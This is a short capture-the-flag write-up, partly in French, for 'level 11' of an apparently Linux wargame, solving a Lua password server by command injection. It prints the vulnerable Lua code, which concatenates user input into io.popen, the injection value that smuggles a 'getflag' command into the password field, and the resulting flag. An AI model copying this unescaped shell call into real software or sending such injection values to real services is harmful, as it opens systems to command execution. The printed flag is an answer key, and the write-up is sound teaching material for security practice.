# LEVEL 11

- Let's check what we have: `ls -la`:
```
level11.lua
```
We discover a new type of file with [lua extension](https://www.lua.org/about.html)
- `cat level11.lua`
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

1. On voit dans ce code que ca ouvre un socket sur localhost:5151 \
2. Quand on le lance on a une erreur comme quoi l'addresse n'est pas libre
3. On ouvre donc un autre terminal pour ecouter ce qu'il se passe sur le port 5151. Cette fois-ci le programme marche et nous demande un password.
`nc localhost 5151`
4. On capte qu'il faut bidouiller l'appel a `popen` pour afficher notre flag:
on aimerait que la commande :
```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```
se transforme en:
```lua
prog = io.popen("echo $getflag | sha1sum", "r")
```
On envoit donc la variable suivant lorsque le programme nous demande le mot de passe:
```bash
"echo 'lol'; getflag > /var/crash/flag11; echo 'lol' | sha1sum", "r"
```
result: \
`fa6v5ateaw21peobuub8ipe6s`

